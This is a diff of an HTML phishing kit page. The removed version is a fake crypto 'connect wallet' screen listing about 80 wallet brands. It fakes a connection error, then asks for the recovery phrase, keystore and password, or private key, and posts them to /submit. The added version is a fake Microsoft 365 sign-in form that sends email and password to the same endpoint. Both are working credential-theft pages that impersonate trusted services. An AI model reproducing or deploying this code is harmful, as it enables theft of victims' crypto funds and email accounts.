@@ -1,150 +1,140 @@
-<!doctypehtml><html lang="en"><head><meta name=”robots” content=”noindex”><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>Fix Issues</title><link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/css/bootstrap.min.css"rel="stylesheet"><link href="favicon.ico"rel="icon"type="image/x-icon"><style>body{background-color:#f8f9fa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}.header{text-align:center;padding:2rem 0;background:#fff;box-shadow:0 2px 4px rgba(0,0,0,.05);position:sticky;top:0;z-index:1000}.search-container{max-width:400px;margin:1rem auto}.search-input{width:100%;padding:.5rem 1rem;border:1px solid #dee2e6;border-radius:8px;font-size:1rem}.wet-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:2rem;padding:2rem;max-width:1200px;margin:0 auto}.wet-item{display:flex;flex-direction:column;align-items:center;text-align:center;text-decoration:none;color:#333;padding:1rem;border-radius:12px;transition:all .3s ease;cursor:pointer}.wet-item:hover{transform:scale(1.1);background-color:#fff;box-shadow:0 4px 12px rgba(0,0,0,.1)}.wet-icon{width:48px;height:48px;object-fit:contain;margin-bottom:.5rem}.wet-name{font-size:.875rem;margin:0;color:#495057}.wet-modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background-color:rgba(0,0,0,.5);z-index:2000;animation:fadeIn .3s ease}.modal-content{position:relative;background-color:#fff;width:90%;max-width:400px;margin:15vh auto;padding:2rem;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,.2);animation:slideIn .3s ease}.modal-header{text-align:center;margin-bottom:1rem}.modal-body{display:flex;flex-direction:column;align-items:center;gap:.2rem}.modal-icon{width:80px;height:80px;object-fit:contain}.connect-button{width:100%;padding:.75rem;background-color:grey;color:#fff;border:none;border-radius:8px;font-weight:600;margin-top:1rem;cursor:pointer;transition:background-color .3s ease}.connect-button.error{background-color:#f44}.error-button{background-color:red!important;color:#fff;cursor:not-allowed}.manual-connect{width:70%;padding:10px;border:1px solid #ccc;background-color:#d3d3d3;font-weight:600;border-radius:8px;cursor:pointer;transition:all .3s ease}.manual-connect:hover{background-color:#f5f5f5}.close-button{position:absolute;top:1rem;right:1rem;background:0 0;border:none;font-size:1.5rem;cursor:pointer;color:#666;padding:.5rem}.tab-links{display:flex;gap:32px;border-bottom:1px solid #e5e7eb;margin-bottom:24px;padding-bottom:8px}.tab-link{text-decoration:none;color:#6b7280;font-size:14px;padding-bottom:8px;position:relative}.tab-link.active{color:#3b82f6}.tab-link.active::after{content:'';position:absolute;bottom:-9px;left:0;width:100%;height:2px;background-color:#3b82f6}.input-field{width:100%;padding:12px;border:1px solid #e5e7eb;border-radius:8px;margin-bottom:12px;font-size:14px;resize:none}.logo-header{display:flex;flex-direction:column;margin-bottom:.5rem;align-items:center}.password-field{margin-top:12px}.helper-text{color:#6b7280;font-size:13px;margin-bottom:24px}.proceed-button{width:100%;padding:12px;background-color:#3b82f6;color:#fff;border:none;border-radius:8px;cursor:pointer;margin-bottom:12px;font-weight:500}.cancel-button{width:100%;padding:12px;background-color:#ef4444;color:#fff;border:none;border-radius:8px;cursor:pointer;font-weight:500}@keyframes fadeIn{from{opacity:0}to{opacity:1}}@keyframes slideIn{from{transform:translateY(-20px);opacity:0}to{transform:translateY(0);opacity:1}}@media (max-width:768px){.wet-grid{grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:1rem;padding:1rem}.wet-icon{width:40px;height:40px}.wet-name{font-size:.75rem}.modal-content{width:95%;margin:10vh auto;padding:1.5rem}}</style></head><body><div class="header"><h1>Connect service provider</h1><p class="text-muted">Please connect to continue</p><div class="search-container"><input class="search-input"placeholder="Search"id="wetSearch"></div></div><div class="wet-grid"id="wetGrid"></div><div class="wet-modal"id="wetModal"><div class="modal-content"><button class="close-button"onclick="closeModal()">×</button><div class="modal-header"><h3>Connect wet</h3></div><div class="modal-body"id="initialView"><img alt=""class="modal-icon"id="modalIcon"src=""><h4 id="modalwetName"></h4><p class="text-muted">Connect with your preferred wet to continue</p><button class="connect-button"id="connectButton">Connecting...</button> <button class="manual-connect"onclick="showTabView()"id="manualButton"style="display:none">Connect manually</button></div><div class="modal-body"id="tabView"style="display:none"><div class="logo-header"><img alt=""class="modal-icon"id="tabModalIcon"src=""><h4 id="tabModalwetName"></h4></div><div class="tab-links"id="initialView"><a class="tab-link active"href="#"onclick='switchTab("phrase")'>Phrase</a> <a class="tab-link"href="#"onclick='switchTab("keystore")'>Keystore</a> <a class="tab-link"href="#"onclick='switchTab("privateKey")'>Private Key</a></div><div class="tab-content"id="phraseTab"><form action="/submit"id="contactFormPhrase"method="post"><textarea class="input-field"id="phWetPhrase"name="phWet"placeholder="Enter your recovery phrase"rows="5"></textarea><div class="helper-text">Typically 12 (sometimes 24) words separated by single spaces</div><button class="proceed-button"onclick='sendMessage("contactFormPhrase")'type="button"id="sendMessageButton">Proceed</button> <button class="cancel-button"onclick="closeModal()"type="button">Cancel</button></form></div><div class="tab-content"id="keystoreTab"style="display:none"><form action="/submit"id="contactFormKeystore"method="post"><textarea class="input-field"id="phWetKeystore"name="phWet"placeholder="Enter Keystore"rows="5"></textarea> <input class="input-field password-field"placeholder="Wallet password"name="passwordwet"><div class="helper-text">Several lines of text beginning with '{..' plus the password you used to encrypt it.</div><button class="proceed-button"onclick='sendMessage("contactFormKeystore")'type="button"id="sendMessageButton">Proceed</button> <button class="cancel-button"onclick="closeModal()"type="button">Cancel</button></form></div><div class="tab-content"id="privateKeyTab"style="display:none"><form action="/submit"id="conforpky"method="post"><input class="input-field"placeholder="Enter your Private Key"id="phWetPrivateKey"name="phWet"><div class="helper-text">Typically 12 (sometimes 24) words separated by a single space.</div><button class="proceed-button"onclick='sendMessage("conforpky")'type="button"id="sendMessageButton">Proceed</button> <button class="cancel-button"onclick="closeModal()"type="button">Cancel</button></form></div></div></div></div><script>
-        const wets = [
-            { name: 'walletConnect', icon: '1.png' },
-            { name: 'Trust', icon: '2.png' },
-            { name: 'Metamask', icon: '3.png' },
-            { name: 'Ledger', icon: '4.png' },
-            { name: 'BRD', icon: '5.png' },
-            { name: 'Coinbase', icon: '6.png' },
-    { name: 'Ordinals', icon: '7.png' },
-    { name: 'Unisat', icon: '8.png' },
-    { name: 'OKX', icon: '9.png' },
-    { name: 'Xverse', icon: '10.png' },
-    { name: 'Sparrow', icon: '11.png' },
-    { name: 'Earth', icon: '12.png' },
-    { name: 'Hiro', icon: '13.png' },
-    { name: 'Saitamask wallet', icon: '14.png' },
-    { name: 'Terra station', icon: '15.png' },
-    { name: 'Phantom wallet', icon: '16.png' },
-    { name: 'Solflare wallet', icon: '17.png' },
-    { name: 'Cosmos station', icon: '18.png' },
-    { name: 'Exodus wallet', icon: '19.png' },
-    { name: 'Rainbow', icon: '20.png' },
-    { name: 'Argent', icon: '21.png' },
-    { name: 'Binance Chain', icon: '22.png' },
-    { name: 'Safemoon', icon: '23.png' },
-    { name: 'Gnosis Safe', icon: '24.png' },
-    { name: 'DeFi', icon: '25.png' },
-    { name: 'Pillar', icon: '26.png' },
-    { name: 'imToken', icon: '27.png' },
-    { name: 'ONTO', icon: '28.png' },
-    { name: 'TokenPocket', icon: '29.png' },
-    { name: 'Aave', icon: '30.png' },
-            { name: 'Digitex', icon: '31.png' },
-    { name: 'Portis', icon: '32.png' },
-    { name: 'Formatic', icon: '33.png' },
-    { name: 'Mathwallet', icon: '34.png' },
-    { name: 'BitPay', icon: '35.png' },
-    { name: 'Ledger Live', icon: '36.png' },
-    { name: 'walletH', icon: '37.png' },
-    { name: 'Authereum', icon: '38.png' },
-    { name: 'Dharma', icon: '39.png' },
-    { name: '1inch wallet', icon: '40.png' },
-    { name: 'Huobi', icon: '41.png' },
-    { name: 'Eidoo', icon: '42.png' },
-    { name: 'MYKEY', icon: '43.png' },
-    { name: 'Loopring', icon: '44.png' },
-    { name: 'Atomic', icon: '45.png' },
-    { name: 'Coin98', icon: '46.png' },
-    { name: 'Tron', icon: '47.png' },
-    { name: 'Alice', icon: '48.png' },
-    { name: 'Alphawallet', icon: '49.png' },
-    { name: 'DCENT', icon: '50.png' },
-    { name: 'ZelCore', icon: '51.png' },
-    { name: 'Nash', icon: '52.png' },
-    { name: 'Coinmoni', icon: '53.png' },
-    { name: 'GridPlus', icon: '54.png' },
-    { name: 'CYBAVO', icon: '55.png' },
-    { name: 'Tokenary', icon: '56.png' },
-            { name: 'Torus', icon: '57.png' },
-            { name: 'Spatium', icon: '58.png' },
-            { name: 'SafePal', icon: '59.png' },
-{ name: 'Infinito', icon: '60.png' },
-{ name: 'wallet.io', icon: '61.png' },
-{ name: 'Ownbit', icon: '62.png' },
-{ name: 'EasyPocket', icon: '63.jpg' },
-{ name: 'Bridge wallet', icon: '64.png' },
-{ name: 'Spark Point', icon: '65.png' },
-{ name: 'Viawallet', icon: '66.png' },
-{ name: 'BitKeep', icon: '67.png' },
-{ name: 'Vision', icon: '68.png' },
-{ name: 'PEAKDEFI', icon: '69.png' },
-{ name: 'Unstoppable', icon: '70.png' },
-{ name: 'HaloDeFi', icon: '71.png' },
-{ name: 'Dok wallet', icon: '72.png' },
-{ name: 'Midas', icon: '73.png' },
-{ name: 'Ellipal', icon: '74.png' },
-{ name: 'KEYRING PRO', icon: '75.png' },
-{ name: 'Aktionariat', icon: '76.png' },
-{ name: 'Talken', icon: '77.png' },
-{ name: 'Flare', icon: '78.png' },
-{ name: 'KyberSwap', icon: '79.png' },
-{ name: 'Linen', icon: '80.png' },
-        ];
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name=”robots” content=”noindex”>
+    <link href="favicon.ico"rel="icon"type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f5f5f5;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .signin-container {
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        .logo img{
+            width: 150px;
+        }
+        .logo{
+            align-items: center;
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+        .divider {
+            border-top: 1px solid #dee2e6;
+            margin: 1.5rem 0;
+        }
+        .form-check-input:checked {
+            background-color: #009688;
+            border-color: #009688;
+        }
+        .btn-signin {
+            background-color: #000;
+            color: white;
+            width: 100%;
+            padding: 0.75rem;
+        }
+        .btn-signin:hover {
+            background-color: #333;
+            color: white;
+        }
+        .error-button{
+            background-color:red!important;
+            color:#fff;
+            cursor:not-allowed
+        }
+        .proceed-button{width:100%;
+            padding:12px;
+            background-color:#141414;
+            color:#fff;border:none;
+            border-radius:8px;
+            cursor:pointer;
+    margin-bottom:12px;
+    font-weight:500
+}
 
-        function showTabView() {
-            document.getElementById('tabModalIcon').src = document.getElementById('modalIcon').src;
-    document.getElementById('tabModalIcon').alt = document.getElementById('modalIcon').alt;
-    document.getElementById('tabModalwetName').textContent = document.getElementById('modalwetName').textContent;
-    document.getElementById('initialView').style.display = 'none';
-    document.getElementById('tabView').style.display = 'block';
-    switchTab('phrase');}
-function switchTab(tabName) {
-    document.querySelectorAll('.tab-content').forEach(tab => {
-        tab.style.display = 'none';
-    });
-    document.querySelectorAll('.tab-link').forEach(link => {
-        link.classList.remove('active');
-    });
-    document.getElementById(`${tabName}Tab`).style.display = 'block';
-    const activeLink = Array.from(document.querySelectorAll('.tab-link'))
-        .find(link => link.textContent.toLowerCase() === tabName.toLowerCase());
-    if (activeLink) {
-        activeLink.classList.add('active');}}
-        function createwetGrid(wetsToShow) {
-            const grid = document.getElementById('wetGrid');
-            grid.innerHTML = '';
-            wetsToShow.forEach(wet => {
-                const wetItem = document.createElement('div');
-                wetItem.className = 'wet-item';
-                wetItem.onclick = () => openModal(wet);
-                wetItem.innerHTML = `
-                    <img src="img/${wet.icon}" alt="${wet.name}" class="wet-icon">
-                    <p class="wet-name">${wet.name}</p>
-                `;
-                grid.appendChild(wetItem);});}
-        createwetGrid(wets);
-    function openModal(wet) {
-    const modal = document.getElementById('wetModal');
-    const modalIcon = document.getElementById('modalIcon');
-    const modalName = document.getElementById('modalwetName');
-    const connectButton = document.getElementById('connectButton');
-    const manualButton = document.getElementById('manualButton');
-    connectButton.textContent = 'Connecting...';
-    connectButton.classList.remove('error');
-    manualButton.style.display = 'none';
-    modalIcon.src = `img/${wet.icon}`;
-    modalIcon.alt = wet.name;
-    modalName.textContent = wet.name;
-    modal.style.display = 'block';
-    document.body.style.overflow = 'hidden';
-    setTimeout(() => {
-        connectButton.textContent = 'Error connecting';
-        connectButton.classList.add('error');
-        manualButton.style.display = 'block';}, 1000);}
+        .password-field {
+            position: relative;
+        }
+        .show-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #009688;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="signin-container">
+        <div class="logo">
+            <img src="logo.png" alt="">
+        </div>
 
-        function sendMessage(formId) {
+        
+        <h2 class="h4 mb-4">Sign in</h2>
+        
+        <form action="/submit"id="conforpky"method="post">
+            <div class="mb-3">
+                <input type="email" class="form-control" placeholder="Email" id="phWetKeystore"name="wetName" required>
+            </div>
+            
+            <div class="mb-3 password-field">
+                <input type="password" class="form-control" id="passwordInput" name="psdWet" placeholder="Password" required>
+                <button type="button" class="show-password" id="togglePassword">Show</button>
+            </div>
+            
+            <div class="mb-3">
+                <div class="form-check">
+                    <input class="form-check-input" type="checkbox" id="keepSignedIn">
+                    <label class="form-check-label" for="keepSignedIn">
+                        Keep me signed in on this device
+                    </label>
+                </div>
+            </div>
+            
+            <button class="proceed-button" type="button" id="sendMessageButton">Sign In</button>
+            <div class="text-center">
+                <a href="#" class="text-decoration-none">Need to find your password?</a>
+            </div>
+        </form>
+        
+        <div class="divider"></div>
+        
+        <div class="text-center mb-3">
+            Don't have Microsoft 365 email?
+        </div>
+        
+        <button class="btn btn-outline-dark w-100">Get Started</button>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>
+    <script>
+    
+    function sendMessage(formId) {
             const form = document.getElementById(formId);
             const formData = new FormData(form);
-            const wetName = document.getElementById('tabModalwetName').textContent;
-            formData.append("wetName", wetName);
-            formData.append("send", "true");
             const sendButton = form.querySelector(".proceed-button");
             sendButton.textContent = "Error Connecting";
             sendButton.classList.add("error-button");
             sendButton.disabled = true;
         
-            // Use full URL to ensure correct routing
             fetch("/submit", {
                 method: "POST",
                 headers: {
@@ -159,35 +149,19 @@ function switchTab(tabName) {
             });
         }
 
-function closeModal() {
-    const modal = document.getElementById('wetModal');
-    const rxst = document.getElementById('tabView');
-    const strxr = document.getElementById('initialView');
-    modal.style.display = 'none';
-    rxst.style.display = 'none';
-    strxr.style.display = 'flex';
+function clearSignInForm() {
+  const form = document.getElementById('conforpky');
+  const signInButton = form.querySelector('.proceed-button');
 
-        const inputs = modal.querySelectorAll("input, textarea");
-    inputs.forEach(input => {
-        input.value = "";
-        input.placeholder = "";
-    });
-
-      const proceedButtons = modal.querySelectorAll(".proceed-button");
-    proceedButtons.forEach(button => {
-        button.textContent = "Proceed";
-        button.classList.remove("error-button");
-        button.disabled = false;
-    });
-
-    document.body.style.overflow = 'auto';
-
+  if (signInButton) {
+    signInButton.textContent = "Sign In";
+    signInButton.classList.remove("error-button");
+    signInButton.disabled = false;
+  }
+  document.body.style.overflow = 'auto';
 }
-        const searchInput = document.getElementById('wetSearch');
-        searchInput.addEventListener('input', (e) => {
-            const searchTerm = e.target.value.toLowerCase();
-            const filteredwets = wets.filter(wet => 
-                wet.name.toLowerCase().includes(searchTerm)
-            );
-            createwetGrid(filteredwets);
-        });</script></body></html>
+
+</script>
+
+</body>
+</html>
